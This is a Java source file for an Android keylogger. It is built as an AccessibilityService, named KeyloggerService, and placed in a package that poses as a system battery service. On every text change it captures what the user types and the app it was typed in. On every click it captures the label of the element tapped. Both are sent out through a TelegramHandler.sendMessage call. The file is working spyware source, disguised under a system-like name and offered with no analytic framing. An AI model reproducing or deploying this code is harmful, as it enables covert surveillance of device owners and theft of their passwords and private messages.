package com.android.system.batteryservice;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyloggerService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED)
        {
            CharSequence inputText = event.getText().toString();
            CharSequence packageName = event.getPackageName();

            if (inputText != null && inputText.length() > 0) {
                String log = "⌨️ Input in app: " + packageName + "\nTesto: " + inputText;
                TelegramHandler.sendMessage(log);
            }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED)
        {
            AccessibilityNodeInfo node = event.getSource();
            if (node != null) {
                String clickedText = "(vuoto)";
                if (node.getText() != null) {
                    clickedText = node.getText().toString();
                } else if (node.getContentDescription() != null) {
                    clickedText = node.getContentDescription().toString();
                }
                String log = "🖱️ Click in app: " + event.getPackageName() + "\nElemento: " + clickedText;
                TelegramHandler.sendMessage(log);
            }
        }

    }

    @Override
    public void onInterrupt() {
        // Quando il servizio viene interrotto (di solito ignorabile)
    }
}
